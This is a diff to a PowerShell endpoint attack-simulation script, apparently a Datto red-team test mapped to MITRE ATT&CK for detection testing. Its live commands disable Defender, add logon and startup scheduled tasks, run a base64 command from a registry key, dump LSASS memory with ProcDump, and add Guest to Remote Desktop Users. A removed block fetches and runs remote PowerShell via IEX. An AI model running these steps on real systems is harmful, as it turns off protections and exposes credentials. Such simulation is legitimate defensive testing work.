@@ -7,7 +7,7 @@ If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 Install-Module base64 -Scope CurrentUser 
 Install-Module powershell-yaml -Scope CurrentUser
 Write-Host "Starting Datto Attack Simulator"
-New-Item -Path 'C:\' -Name "AttackSim" -ItemType "directory"
+New-Item -Path 'C:\' -Name "AttackSim" -ItemType "directory" -ea 0
 
 
 Write-Host "Starting Single Endpoint Behavioral Attack Simulation. No malware is used."
@@ -36,18 +36,11 @@ powershell.exe -Win N -exec bypass -nop -command {
 Start-Sleep 3
 Remove-Item $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
 
-
-Write-Host "Initiating T1059.005 - VBScript from Microsoft Office Exploit"
-Powershell.exe -Win N -exec bypass -nop -command {
-    IEX (Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
-    Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/228dcb1ae300d5808a7d4910252dc48f7d4201ec/atomics/T1059.005/src/T1059.005-macrocode.txt" -OutFile "$env:temp\T1059.005-macrocode.txt"
-    Invoke-Maldoc -macroFile "$env:temp\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
-}
 Start-Sleep 5
 
 
 # DISCOVERY
-Write-Host "`n`nStarting discovery step"
+Write-Host -ForegroundColor Cyan "`n`nStarting discovery step"
 
 Write-Host "Initiating Discovery - T1082 - System Information Discovery"
 Write-Host "When an adversary first gains access to a system, they often gather detailed information about the compromised system and network including users, operating system, hardware, patches, and architecture. Adversaries may use the information to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions like a ransom.`n"
@@ -70,7 +63,7 @@ Start-Sleep 10
 
 
 #### EVASION
-Write-Host "`n`nStarting defense evasion step"
+Write-Host -ForegroundColor Cyan "`n`nStarting defense evasion step"
 Write-Host "Initiating Defense Evasion - T1089 - Disabling Security Tools"
 Write-Host "Disabling Defender..."
 powershell.exe -Win N -exec bypass -nop -command 'Set-MpPreference -DisableRealtimeMonitoring $true'
@@ -101,7 +94,7 @@ Remove-Item test.txt -Force -ea 0
 
 
 #### PERSISTENCE
-Write-Host "`n`nStarting Foothold / Persistence Step"
+Write-Host -ForegroundColor Cyan "`n`nStarting Foothold / Persistence Step"
 
 Write-Host "Autostart locations like Registry Run Keys or files in User Startup Folders will cause that program to execute when a user logs in or the system reboots. Each autostart may have it’s own trigger for automated execution.`n"
 Write-Host "Adding T1547.001 - Registry Run Key Foothold"
@@ -131,9 +124,10 @@ Powershell.exe -Win N -exec bypass -nop -command {
 
 
 
-Write-Host "Persistence - T1053 - Scheduled Task Startup Script"
-schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
-schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
+Write-Host "Adding Persistence - T1053 - On Logon Scheduled Task Startup Script"
+schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" /f
+Write-Host "Adding Persistence - T1053 - On Startup cheduled Task Startup Script"
+schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe" /f
 Start-sleep 2
 #schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
 #schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
@@ -143,17 +137,17 @@ Start-Sleep 10
 Write-Host "Testing Persistence by executing T1059.001 - Powershell Command From Registry Key"
 $Cmd = 'Write-Host -ForegroundColor Red "Mess with the Best, Die like the rest!"'
 $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
-reg.exe add "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d "V3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiTWVzcyB3aXRoIHRoZSBCZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCEi"
+reg.exe add "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d "V3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiTWVzcyB3aXRoIHRoZSBCZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCEi" /f
 Powershell.exe -Win N -exec bypass -nop -command { iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\RedTeamTest').RT))) }
-
-#Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore
+Start-Sleep 2
+Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore
 
 
 
 # CREDENTIAL
-Write-Host "`nStarting Credential Harvesting step"
+Write-Host -ForegroundColor Cyan "`nStarting Credential Harvesting step"
 Write-Host "Downloading ProcDump.exe"
-Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile 'C:\AttackSim\procdump.exe'
+Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile 'C:\AttackSim\procdump.exe' -Force
 Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
 Start-Process -FilePath 'C:\AttackSim\Procdump.exe' -ArgumentList "-ma lsass.exe lsass.dmp -accepteula" 2>$null -Wait
 
@@ -179,7 +173,7 @@ Powershell.exe -Win N -exec bypass -nop -command {
 
 
 # LATERAL MOVEMENT
-Write-Host "`nStarting Lateral Movement Step"
+Write-Host -ForegroundColor Cyan "`nStarting Lateral Movement Step"
 Write-Host "Adding Passwordless Guest Accounts to Remote Desktop Users"
 net localgroup "Remote Desktop Users" Guest /add
 Start-Sleep 3
@@ -188,7 +182,7 @@ net localgroup "Remote Desktop Users" Guest /delete
 
 
 #### IMPACT
-Write-Host "`nStarting Impact Step"
+Write-Host -ForegroundColor Cyan "`nStarting Impact Step"
 Write-Host "Testing Rule: Disable Automatic Windows Recovery"
 Write-Host "(Impact-T1490) Automatic Windows recovery features disabled"
 Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
